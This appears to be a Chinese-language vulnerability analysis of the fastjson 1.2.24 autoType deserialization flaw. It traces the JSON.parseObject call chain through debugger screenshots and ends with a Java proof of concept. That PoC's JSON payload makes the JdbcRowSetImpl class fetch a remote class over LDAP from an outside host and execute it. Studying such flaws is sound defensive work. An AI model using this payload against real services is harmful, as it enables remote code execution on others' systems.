.. _1.2.24:

版本1.2.24
================

.. |br| raw:: html

   <br/>

漏洞说明
----------
利用autoType技术，即使用@type可以指定远程调用类的类型。通过java类JdbcRowSetImpl加载可控服务器上的payload类，在目标机器上执行代码。

此处的1.2.24版本，是指可利用该漏洞的最后一个版本，之前的版本同样适用该漏洞。


调试
-------

.. figure:: images/1.2.24/main1-1.png

   主程序

   通过在fastjson.JSON.parseObject设置断点进行分步调试

.. figure:: images/1.2.24/json24-1-1.png

   JSON.parseObject

   进入JSON.class的parseObject函数

.. figure:: images/1.2.24/json24-2-1.png

   JSON.parse

.. figure:: images/1.2.24/json24-3-1.png

   JSON.parse2

   DefaultJSONParser构造函数对输入的json字符串进行解析、标记和词法分析

.. figure:: images/1.2.24/json24-3-2.png

   parse变量

   变量parser是一个DefaultJSONParser对象，包含对输入json字符串的分析信息。

.. figure:: images/1.2.24/defaultjsonparser24-1-1.png

   DefaultJSONParser.parse

   进入DefaultJSONParser.class的parse函数，这里的this指针，指向的是一个DefaultJSONParser对象，也就是前面的parser变量。

.. figure:: images/1.2.24/defaultjsonparser24-2-1.png

   DefaultJSONParser.parse1

.. figure:: images/1.2.24/defaultjsonparser24-2-2.png

   DefaultJSONParser.parse1

   根据token取值12，跳转到对应的分支

.. figure:: images/1.2.24/defaultjsonparser24-3-1.png

   DefaultJSONParser.parse2

.. figure:: images/1.2.24/defaultjsonparser24-3-2.png

   DefaultJSONParser.parse2

   在parseObject函数中对传入的json字符串进行逐个字符的解析处理，key的取值是@type，与JSON.DEFAULT_TYPE_KEY一致，调用TypeUtils.loadClass获取指定类是否在fastjson中有对应的预定义类。

.. figure:: images/1.2.24/typeutils24-1-1.png

   TypeUtils.loadClass

   在mapping中没有预定义的类型相匹配

.. figure:: images/1.2.24/typeutils24-1-2.png

   mapping变量

   可以看到mapping中保存的预定义类型


.. figure:: images/1.2.24/typeutils24-1-3.png

   TypeUtils.loadClass

   生成当前环境的类加载器，并判断是否包含json字符串中输入的类型，如果包含则保存到mapping变量中，如果不包含则再从当前系统类Class中查找，再找不到就返回null。输入的JdbcRowSetImpl在系统环境中可以找到，所以直接返回。


.. figure:: images/1.2.24/defaultjsonparser24-3-3.png

   DefaultJSONParser.parseObject

   返回到DefaultJSONParser.parseObject函数中，对找到的对应类型进行反序列化处理


.. figure:: images/1.2.24/parserconfig24-1-1.png

   ParserConfig.getDeserializer1

   调用ParserConfig类的getDeserializer方法


.. figure:: images/1.2.24/parserconfig24-2-1.png

   ParserConfig.getDeserializer2 

   调用两个参数的getDeserializer方法，继续进行反序列化处理，调用createJavaBeanDeserializer得到反序列化对象，并返回DefaultJSONParser类

.. figure:: images/1.2.24/parserconfig24-2-2.png

   ParserConfig.getDeserializer2 


.. figure:: images/1.2.24/defaultjsonparser24-3-4.png

   ParserConfig.getDeserializer2

   在DefaultJSONParser类中对得到的反序列化对象进行反序列化操作

.. figure:: images/1.2.24/javabeandeserializer24-1-1.png

   JavaBeanDeserializer.deserialze3

   调用JavaBeanDeserializer的反序列化函数

.. figure:: images/1.2.24/javabeandeserializer24-3-1.png

   JavaBeanDeserializer.deserialze5

   调用JavaBeanDeserializer的5参数反序列化函数

.. figure:: images/1.2.24/javabeandeserializer24-3-2.png

   JavaBeanDeserializer.deserialze5

   运行到577行，调用parseField函数

.. figure:: images/1.2.24/javabeandeserializer24-4-1.png

   JavaBeanDeserializer.parseField

.. figure:: images/1.2.24/javabeandeserializer24-4-2.png

   JavaBeanDeserializer.parseField

   调用FieldDeserializer的parseField函数

.. figure:: images/1.2.24/defaultfielddeserializer24-1-1.png

   DefaultFieldDeserializer.parseField

.. figure:: images/1.2.24/defaultfielddeserializer24-1-2.png

   DefaultFieldDeserializer.parseField

   调用FieldDeserializer.setValue，object是传入的JdbcRowSetImpl类

.. figure:: images/1.2.24/fielddeserializer24-1-1.png

   FieldDeserializer.setValue

   在该函数中，调用Method.invoke，执行JdbcRowSetImpl的setAutoCommit方法，触发调用远程类，并实例化，从而执行代码。
  
.. figure:: images/1.2.24/stacks.png

   调用栈

.. figure:: images/1.2.24/fastjson1.2.24.png
   :scale: 100%
   :width: 800 px
   :height: 400 px

   调用序列图

POC
-----

.. code-block:: java

   package org.example;

   import com.alibaba.fastjson.JSON;

   public class Main {
       public static void main(String[] args) {

           String s = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://192.168.0.102:1389/ExTest\", \"autoCommit\":true}";
           Object contentValue = JSON.parseObject(s);
       }
   }


